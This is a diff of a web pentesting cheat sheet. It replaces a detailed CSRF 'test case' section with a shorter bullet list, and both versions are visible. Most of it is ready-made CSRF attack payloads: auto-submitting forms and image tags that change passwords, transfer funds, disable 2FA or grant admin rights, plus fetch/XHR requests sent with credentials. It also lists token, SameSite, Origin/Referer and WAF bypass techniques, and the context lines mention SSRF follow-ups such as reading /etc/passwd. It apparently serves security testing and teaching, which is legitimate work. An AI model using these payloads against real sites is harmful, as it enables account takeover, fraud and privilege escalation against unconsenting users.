@@ -1883,305 +1883,117 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 * Redis exploitation → gopher payload
 * Kubernetes takeover → access API server
 * File disclosure → file:///etc/passwd
+
+## CSRF Test Case (with Bypass Cases)
+
+# 🔹 Basic CSRF Payloads
+
+* Simple GET CSRF:  https://target.com/change-email?email=evil@attacker.com → Triggers request automatically.
+* Link-based CSRF:  https://target.com/delete-accountClick me</a> → Social engineering.
+* Hidden iframe request:  https://target.com/admin/delete-user?id=1</iframe> → Silent execution.
+
+# 🔹 POST-Based CSRF Attacks
+* JSON CSRF (if supported):
+  js
+  fetch("https://target.com/api/update", {
+    method: "POST",
+    body: JSON.stringify({"role":"admin"})
+  })
   
-# ✅ **c – Complete Test Case (with Bypass Cases)**
----
-# **1. List of Vulnerabilities (CSRF Attack Surface)**
+# 🔹 CSRF Token Bypass Techniques
 
-* **1.1 Missing CSRF Token Validation**
-  No anti-CSRF token → attacker forces authenticated actions.
+* Missing token attack:  Send request without CSRF token → works if not enforced.
+* Token reuse:  Use previously captured valid token → replay attack.
+* Predictable token:  csrf_token=12345 → weak/random generation.
+* Token in GET:  https://target.com/?token=abc123 → exposed/reflected.
+* Token not tied to session:  Use token from another user/session.
 
-* **1.2 Predictable / Reusable CSRF Tokens**
-  Token not random, or same token reused across sessions.
+# 🔹 SameSite Cookie Bypass
 
-* **1.3 No SameSite Cookie Protection**
-  Cookies automatically sent with cross-site requests.
+* Use GET request:  Cookies sent if SameSite=Lax → bypass with GET.
+* Top-level navigation:  https://target.com/action → allowed by browser.
+* Link click forcing:  Social engineering to trigger request.
 
-* **1.4 Token Not Bound to Session/User**
-  Token reused by another user.
+# 🔹 Content-Type Bypass
 
-* **1.5 Token Not Bound to HTTP Method**
-  Token works even when method changes from POST → GET.
+* Change content type:  application/x-www-form-urlencoded → might bypass JSON-only validation.
+* Send JSON as text:  Content-Type: text/plain
+* Multipart bypass:  multipart/form-data
+* Missing content-type:  No header → backend may still parse.
 
-* **1.6 No Origin/Referer Validation**
-  Server does not validate request origin.
+# 🔹 Origin / Referer Check Bypass
 
-* **1.7 CSRF with JSON Endpoints**
-  API accepts requests from <script> or forms.
+* Missing header:  Remove Origin header → backend skips validation.
+* Fake origin: Origin: https://trusted.com
+* Null origin: Origin: null → some servers trust null.
+* Referer spoof:  Referer: https://trusted.com/page
 
-* **1.8 CORS Misconfig + CSRF Combo**
-  Exploits both → severe account takeover.
+# 🔹 Advanced CSRF Exploitation
 
-* **1.9 Multi-Step CSRF**
-  Multi-page transaction forced automatically.
+* CORS + CSRF combo:  Use misconfigured CORS to read response.
+* DNS rebinding:  Victim browser resolves attacker domain → internal target.
+* Login CSRF:  Force victim to log into attacker account:
+* Logout CSRF:  https://target.com/logout
 
-* **1.10 Clickjacking + CSRF Hybrid Attack**
-  User tricked into clicking invisible CSRF-trigger action.
+# 🔹 GET Parameter Manipulation
 
----
+* Multiple parameters:  ?role=user&role=admin
+* Hidden parameters:  ?action=delete&id=1
+* Privilege escalation:  ?isAdmin=true
 
-# **2. Sample Payloads (Core Attack Payloads)**
+# 🔹 CSRF in API Endpoints
 
-(Safe training examples — no harmful execution)
+* Fetch API request:
+  js
+  fetch("https://target.com/api/delete", {
+    method: "POST",
+    credentials: "include"
+  })
+  
+* XHR request:
+  js
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST","https://target.com/update",true);
+  xhr.send("role=admin");
+  
 
-### **2.1 HTML Auto-Submit Form (Classic CSRF PoC)**
+# 🔹 WAF Bypass Techniques (CSRF)
 
-```html
-<html>
-<body onload="document.forms[0].submit()">
-<form action="https://victim.com/user/update-email" method="POST">
-    <input type="hidden" name="email" value="attacker@mail.com">
-</form>
-</body>
-</html>
-```
+## 🧩 Request Method Tricks
 
-### **2.2 Image Tag (GET-Based CSRF)**
+* Switch POST → GET:  GET /delete?id=1
+* Use HEAD method:  HEAD /action
+* Use OPTIONS:  OPTIONS /endpoint
 
-```html
-<img src="https://victim.com/settings/disable-2fa">
-```
+## 🧩 Encoding Tricks
 
-### **2.3 CSRF for Money Transfer**
+* URL encoding:  %72%6f%6c%65=admin
+* Double encoding:  %2572%256f%256c%2565=admin
+* Case variation:  RoLe=AdMiN
 
-```html
-<form action="https://victim.com/transfer" method="POST">
-  <input type="hidden" name="amount" value="5000">
-  <input type="hidden" name="to" value="attacker">
-</form>
-<script>document.forms[0].submit();</script>
-```
+## 🧩 Parameter Pollution
 
-### **2.4 JSON CSRF via POST (simple PoC)**
+* Duplicate params:  role=user&role=admin
+* Array style:  role[]=user&role[]=admin
 
-```html
-<form action="https://victim.com/api/profile" method="POST"
-      enctype="text/plain">
-{"email":"attacker@mail.com"}
-</form>
-<script>document.forms[0].submit();</script>
-```
+## 🧩 Header Manipulation
 
----
+* Remove Origin/Referer
+* Modify headers manually via proxy tools
+* Add fake headers:  X-Origin: trusted
 
-# **3. Bypass Payloads (Advanced Techniques)**
+## 🧩 Delivery Bypass
 
-### **3.1 CSRF Token Stripping via Content-Type**
+* Use different HTML tags:  * <img>,  * <iframe>, \\,  * \\
+* Use delayed execution:  setTimeout(() => form.submit(), 1000)
 
-Server accepts:
+# 🔹 Real-World Attack Scenarios
 
-```
-Content-Type: text/plain
-```
-
-Bypass token requirement:
-
-```html
-<form action="https://victim.com/api/change" enctype="text/plain" method="POST">
-{"role":"admin"}
-</form>
-```
-
-### **3.2 SameSite Cookie Bypass**
-
-If server sets:
-
-```
-Set-Cookie: session=abc; SameSite=None; Secure
-```
-
-Cookies still sent cross-site → CSRF possible.
-
-### **3.3 JSON CSRF Bypass with Misconfigured Parsers**
-
-```html
-<form action="https://victim.com/api/update" enctype="application/json" method="POST">
-{"admin":true}
-</form>
-```
-
-### **3.4 CORS-Assisted CSRF**
-
-If server returns:
-
-```
-Access-Control-Allow-Credentials: true
-Access-Control-Allow-Origin: https://attacker.com
-```
-
-Attacker steals API data:
-
-```js
-fetch("https://victim.com/account", {credentials:"include"})
-```
-
-### **3.5 Flash CSRF (Legacy Bypass)**
-
-If client-side protects only HTML forms:
-
-```html
-<object data="csrf.swf"></object>
-```
-
-### **3.6 Null-Origin Bypass**
-
-`Origin: null` via sandboxed iframe:
-
-```html
-<iframe sandbox="allow-scripts" srcdoc="
-    <form action='https://victim.com/delete' method='POST'></form>
-    <script>document.forms[0].submit()</script>
-"></iframe>
-```
-
-### **3.7 Referer Leak Bypass**
-
-If server checks only Referer domain:
-
-```
-https://victim.com.evil.net/update
-```
-
-→ bypasses regex.
-
-### **3.8 Preflight Bypass via GET → POST Confusion**
-
-If API incorrectly allows:
-
-```
-GET /delete-account
-```
-
----
-
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
-
-### **4.1 Change Password CSRF**
-
-```html
-<form action="https://victim.com/password/change" method="POST">
-  <input type="hidden" name="newPassword" value="Attacker123">
-</form>
-```
-
-### **4.2 Disable 2FA**
-
-```html
-<img src="https://victim.com/user/2fa/disable">
-```
-
-### **4.3 Admin Privilege Escalation**
-
-```html
-<form action="https://victim.com/admin/update-role" method="POST">
-  <input type="hidden" name="role" value="admin">
-  <input type="hidden" name="user" value="attacker">
-</form>
-```
-
-### **4.4 OAuth/SSO CSRF (Force Login)**
-
-```html
-<img src="https://victim.com/oauth/authorize?client_id=attacker&response_type=token">
-```
-
-### **4.5 CSRF with Multi-Step Transaction**
-
-```html
-<iframe src="https://victim.com/step1?amount=5000"></iframe>
-<iframe src="https://victim.com/step2"></iframe>
-<iframe src="https://victim.com/confirm"></iframe>
-```
-
-### **4.6 REST API CSRF**
-
-```html
-<form action="https://victim.com/api/user" enctype="application/x-www-form-urlencoded">
-  username=hacked&role=admin
-</form>
-```
-
----
-
-# **5. Validation / Test Steps**
-
-**Step 1:** Identify state-changing endpoints
-→ profile updates, finance actions, admin functions.
-
-**Step 2:** Check if tokens exist
-
-* hidden inputs
-* headers
-* double submit cookies
-
-**Step 3:** Verify token tied to session/user
-→ must be unique per session.
-
-**Step 4:** Try basic CSRF PoC
-→ auto-submitting form.
-
-**Step 5:** Try JSON endpoints
-→ test `text/plain`, `application/json`, etc.
-
-**Step 6:** Test Origin and Referer validation
-→ send custom header values.
-
-**Step 7:** Try advanced bypasses
-→ Null-Origin, SameSite=None, CORS combo.
-
----
-
-# **6. Expected Results / Impact**
-
-* Profile modifications.
-* Email/Password change → account takeover.
-* Funds transfer without consent.
-* Admin privilege escalation.
-* OAuth token hijack or unauthorized login.
-* Disabling MFA / security settings.
-
-CSRF can lead to **complete account takeover** and financial loss.
-
-### JSON POST - Simple Request
-
-With XHR :
-
-```html
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://www.example.com/api/setrole");
-//application/json is not allowed in a simple request. text/plain is the default
-xhr.setRequestHeader("Content-Type", "text/plain");
-//You will probably want to also try one or both of these
-//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-//xhr.setRequestHeader("Content-Type", "multipart/form-data");
-xhr.send('{"role":admin}');
-</script>
-```
-
-With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :
-
-```html
-<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
-// this input will send : {"role":admin,"other":"="}
- <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
-</form>
-<script>
- document.getElementById("CSRF_POC").submit();
-</script>
-```
-
-### JSON POST - Complex Request
-
-```html
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://www.example.com/api/setrole");
-xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-xhr.send('{"role":admin}');
-</script>
-```
+* Password change:  Auto-submit form → resets victim password.
+* Fund transfer:  Hidden POST → sends money.
+* Email change:  /change-email?email=evil@attacker.com
+* Account deletion:  /delete-account
+* Admin action abuse:  Silent admin operation using victim session.
 
 ## 6. Two-Factor Authentication (2FA) Bypass
 
